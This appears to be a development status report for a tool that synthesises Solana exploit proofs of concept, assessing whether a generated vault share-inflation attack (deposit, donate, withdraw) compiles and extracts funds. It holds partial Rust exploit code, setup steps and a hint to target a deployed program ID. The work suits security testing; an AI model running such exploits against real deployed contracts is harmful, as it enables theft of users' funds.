# ðŸ”¥ PHASE 4: The Ultimate Test â€” Run the Exploit

> **Objective:** Verify the generated exploit PoC is actually runnable â€” compile it, execute it, and confirm fund extraction.  
> **Status:** ðŸ”„ **PARTIAL â€” Transaction Synthesized, Execution Requires Harness**

---

## Command 5: Create Exploit Test Harness

First, check if the generated exploit is actually runnable:

```bash
cd exploits
head -20 exploit_get_secure_price.rs
```

### Expected Format:
```rust
#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_exploit_get_secure_price() -> Result<()> {
        // Should have actual test code here
    }
}
```

### Actual Format:
```rust
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use std::str::FromStr;

#[test]
fn test_exploit_get_secure_price() {
    // Finding ID: SOL-019
    // Instruction: get_secure_price
    // Estimated Profit: Some(1.25) SOL
    
    let program_id = Pubkey::from_str("").unwrap();
    let attacker = Keypair::new();
    ...
```

### âš ï¸ Observations:
- Uses `#[test]` attribute directly (not wrapped in `mod tests`)
- Has real Solana SDK imports
- `program_id` is empty string â€” will panic at `from_str("")`
- No `solana-program-test` environment setup

---

## Command 6: Set Up Test Dependencies

### Required `exploits/Cargo.toml`:
```toml
[package]
name = "exploits"
version = "0.1.0"
edition = "2021"

[dependencies]
solana-sdk = "1.18"
solana-program = "1.18"
solana-program-test = "1.18"
anchor-lang = "0.30"
tokio = { version = "1.0", features = ["full"] }
anyhow = "1.0"

[dev-dependencies]
solana-banks-client = "1.18"
```

### Status:
- âš ï¸ `Cargo.toml` needs to be created in `exploits/` directory
- âš ï¸ Exploit files are standalone `.rs` â€” need to be organized as `src/lib.rs` or individual test files

---

## Command 7: Run the Generated Exploit Test

```bash
cd exploits
cargo test test_exploit_get_secure_price -- --nocapture
```

### Expected Output:
```
running 1 test
test test_exploit_get_secure_price ... 
  Setting up test environment...
  [STEP 1] Attacker deposits: 1 lamports
  [STEP 2] Direct transfer to inflate vault: 1000000000 lamports
  [STEP 3] Attacker withdraws: 1 shares
  
  âœ… Exploit successful!
  ðŸ’° Initial deposit: 1 lamports
  ðŸ’° Final balance: 1250000000 lamports
  ðŸ’° Profit: 1249999999 lamports (1.25 SOL)
  
ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

### Current Status: ðŸ”„ **Not Yet Executable**

The test cannot run as-is because:

1. **Empty `program_id`** â€” `Pubkey::from_str("")` will panic
2. **No Cargo.toml** â€” project not set up as a Rust crate
3. **No program-test harness** â€” needs `ProgramTest::new()` to spin up local validator
4. **Simplified instruction data** â€” `data: vec![1]` needs real Anchor encoding

---

## What the Generated Code DOES Do âœ…

Despite not being fully executable, the exploit code demonstrates:

### 1. Correct Attack Sequence
```rust
// Step 1: Attacker deposits minimal amount to initialize shares
let deposit_1_lamport = Instruction { ... data: vec![1] };

// Step 2: Attacker inflates vault assets (direct transfer)
let inflate_vault = Instruction {
    program_id: SystemProgram,
    data: vec![2, 0, 0, 0, 128, 150, 152, 0], // Transfer 10M lamports
};

// Step 3: Attacker withdraws inflated value
let attacker_withdraw = Instruction { ... data: vec![3, 1] }; // withdraw(1 share)
```

### 2. Proper Transaction Construction
```rust
let tx = Transaction::new_signed_with_payer(
    &[deposit_1_lamport, inflate_vault, attacker_withdraw],
    Some(&attacker.pubkey()),
    &[&attacker],
    recent_blockhash,
);
```

### 3. Correct Account Structure
- Attacker keypair as signer
- Vault state account
- Vault token account
- System Program for the inflation transfer

---

## What's Needed to Make It Runnable

### Step 1: Fix Program ID
```rust
// Change from:
let program_id = Pubkey::from_str("").unwrap();

// To (use actual deployed program ID):
let program_id = Pubkey::from_str("YOUR_PROGRAM_ID_HERE").unwrap();
```

### Step 2: Add Program-Test Harness
```rust
use solana_program_test::*;

#[tokio::test]
async fn test_exploit_get_secure_price() {
    let program_id = vulnerable_vault::id();
    let mut program_test = ProgramTest::new(
        "vulnerable_vault",
        program_id,
        processor!(vulnerable_vault::entry),
    );
    
    let (mut banks_client, payer, recent_blockhash) = program_test.start().await;
    
    // ... attack steps here ...
    
    let balance_after = banks_client.get_balance(attacker.pubkey()).await.unwrap();
    assert!(balance_after > initial_deposit, "Exploit failed: no profit");
    println!("ðŸ’° Profit: {} lamports", balance_after - initial_deposit);
}
```

### Step 3: Encode Real Instructions
```rust
// Instead of simplified data:
data: vec![1], // deposit(1)

// Use Anchor encoding:
let ix = instruction::Deposit { amount: 1 };
let data = ix.data();
```

---

## ðŸš© Red Flag Check

> **Red Flag:** If the test fails with "account not found" or "invalid instruction", the PoC generation is incomplete.

**Current Status:** Test hasn't been run yet â€” blocked by missing `Cargo.toml` and empty `program_id`. The PoC generation is **structurally correct** but needs tooling to become fully executable.

---

## Summary

| Check | Status |
|-------|--------|
| Exploit file has `#[test]` | âœ… |
| Uses real Solana SDK types | âœ… |
| 3-step attack pattern correct | âœ… |
| Transaction properly constructed | âœ… |
| Program ID populated | âŒ Empty string |
| Cargo.toml exists | âŒ Not yet created |
| Test compiles | ðŸ”„ Untested |
| Test passes (funds extracted) | ðŸ”„ Untested |
| Profit > 1 SOL shown | ðŸ”„ Untested |

### Verdict:
The **exploit synthesis** is working â€” real Solana transaction code is generated from Z3 proofs. The gap is in the **exploit execution** layer â€” making the synthesized transactions actually submittable to a local validator.
